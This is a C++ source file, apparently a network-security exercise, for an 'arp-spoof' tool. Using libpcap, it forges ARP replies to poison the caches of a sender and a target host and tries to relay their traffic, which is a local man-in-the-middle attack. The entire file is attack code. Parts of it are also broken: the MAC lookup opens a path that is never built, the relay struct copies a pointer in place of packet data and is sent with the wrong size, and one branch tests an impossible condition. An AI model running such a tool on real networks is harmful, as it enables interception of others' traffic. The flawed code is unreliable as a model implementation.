#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
struct RelayPacket final {
    EthHdr eth_;
    const u_char *IP;
};
#pragma pack(pop)

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

Mac GetMacAddress(char *ifname) {
    char buf[18];

    int len = strlen(ifname);
    int sz = len + 24;

    char *path = (char *)malloc(sz);

    if (path == NULL) exit(-1);

    int fd = open(path, 0);

    if (fd == -1) exit(-1);

    int bytes = read(fd, buf, 17);

    free(path);
    close(fd);

    return Mac(buf);
}

int main(int argc, char* argv[]) {
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    Mac attacker_mac_addr, victim_mac_addr;
    attacker_mac_addr = GetMacAddress(argv[1]);

    for(int i = 0; i < (argc - 2) / 2; i++){
        EthArpPacket request_packet_1, request_packet_2, infection_packet;

        request_packet_1.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        request_packet_1.eth_.smac_ = attacker_mac_addr;
        request_packet_1.eth_.type_ = htons(EthHdr::Arp);

        request_packet_1.arp_.hrd_ = htons(ArpHdr::ETHER);
        request_packet_1.arp_.pro_ = htons(EthHdr::Ip4);
        request_packet_1.arp_.hln_ = Mac::SIZE;
        request_packet_1.arp_.pln_ = Ip::SIZE;
        request_packet_1.arp_.op_ = htons(ArpHdr::Reply);
        request_packet_1.arp_.smac_ = attacker_mac_addr;
        request_packet_1.arp_.sip_ = htonl(Ip(argv[2 * i + 3]));
        request_packet_1.arp_.tmac_ = Mac("00:00:00:00:00:00");
        request_packet_1.arp_.tip_ = htonl(Ip(argv[2 * i + 2]));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&request_packet_1), sizeof (EthArpPacket));
        if(res != 0) fprintf(stderr, "pcap_sendpacket error, %s\n", pcap_geterr(handle));

        request_packet_2.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        request_packet_2.eth_.smac_ = attacker_mac_addr;
        request_packet_2.eth_.type_ = htons(EthHdr::Arp);

        request_packet_2.arp_.hrd_ = htons(ArpHdr::ETHER);
        request_packet_2.arp_.pro_ = htons(EthHdr::Ip4);
        request_packet_2.arp_.hln_ = Mac::SIZE;
        request_packet_2.arp_.pln_ = Ip::SIZE;
        request_packet_2.arp_.op_ = htons(ArpHdr::Reply);
        request_packet_2.arp_.smac_ = attacker_mac_addr;
        request_packet_2.arp_.sip_ = htonl(Ip(argv[2 * i + 2]));
        request_packet_2.arp_.tmac_ = Mac("00:00:00:00:00:00");
        request_packet_2.arp_.tip_ = htonl(Ip(argv[2 * i + 3]));

        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&request_packet_2), sizeof (EthArpPacket));
        if(res != 0) fprintf(stderr, "pcap_sendpacket error, %s\n", pcap_geterr(handle));

        while (true) {
            struct pcap_pkthdr* header;
            const uint8_t* reply;
            EthArpPacket* reply_packet;

            res = pcap_next_ex(handle, &header, &reply);
            if (res == 0) continue;
            if (res == -1 or res == -2) {
                fprintf(stderr, "pcap_next_ex error, %s\n", pcap_geterr(handle));
                break;
            }

            reply_packet = (EthArpPacket*)reply;

            if (reply_packet->eth_.type_ == htons(EthHdr::Arp) && reply_packet->arp_.op_ == htons(ArpHdr::Reply) && reply_packet->arp_.sip_ == (Ip)htonl(Ip(argv[2 * i + 2]))) {
                infection_packet.eth_.dmac_ = reply_packet->arp_.smac_;
                infection_packet.eth_.smac_ = attacker_mac_addr;
                infection_packet.eth_.type_ = htons(EthHdr::Arp);

                infection_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
                infection_packet.arp_.pro_ = htons(EthHdr::Ip4);
                infection_packet.arp_.hln_ = Mac::SIZE;
                infection_packet.arp_.pln_ = Ip::SIZE;
                infection_packet.arp_.op_ = htons(ArpHdr::Reply);
                infection_packet.arp_.smac_ = attacker_mac_addr;
                infection_packet.arp_.sip_ = htonl((Ip(argv[2 * i + 3])));
                infection_packet.arp_.tmac_ = reply_packet->arp_.smac_;
                infection_packet.arp_.tip_ = htonl(Ip(argv[2 * i + 2]));

                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&infection_packet), sizeof(EthArpPacket));
                if (res != 0) fprintf(stderr, "pcap_sendpacket error, %s\n", pcap_geterr(handle));

            }

            else if (reply_packet->eth_.type_ == htons(EthHdr::Arp) && reply_packet->arp_.op_ == htons(ArpHdr::Reply) && reply_packet->arp_.sip_ == (Ip)htonl(Ip(argv[2 * i + 3]))) {
                victim_mac_addr = reply_packet->arp_.smac_;

                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&infection_packet), sizeof(EthArpPacket));
                if (res != 0) fprintf(stderr, "pcap_sendpacket error, %s\n", pcap_geterr(handle));
            }

            else if (reply_packet->eth_.type_ == htons(EthHdr::Arp) && reply_packet->arp_.sip_ == (Ip)htonl(Ip(argv[2 * i + 2])) && reply_packet->arp_.sip_ == (Ip)htonl(Ip(argv[2 * i +3]))) {
                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&infection_packet), sizeof(EthArpPacket));
                if (res != 0) fprintf(stderr, "pcap_sendpacket error, %s\n", pcap_geterr(handle));
            }

            else if (Mac(reply) == attacker_mac_addr && Mac(reply + 6) == infection_packet.eth_.dmac_) {
                RelayPacket relay_packet;

                relay_packet.eth_.dmac_ = victim_mac_addr;
                relay_packet.eth_.smac_ = attacker_mac_addr;
                relay_packet.IP = reply + 12;

                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&relay_packet), sizeof(EthArpPacket));
                if (res != 0) fprintf(stderr, "pcap_sendpacket error, %s\n", pcap_geterr(handle));
            }
        }
    }
	pcap_close(handle);
}
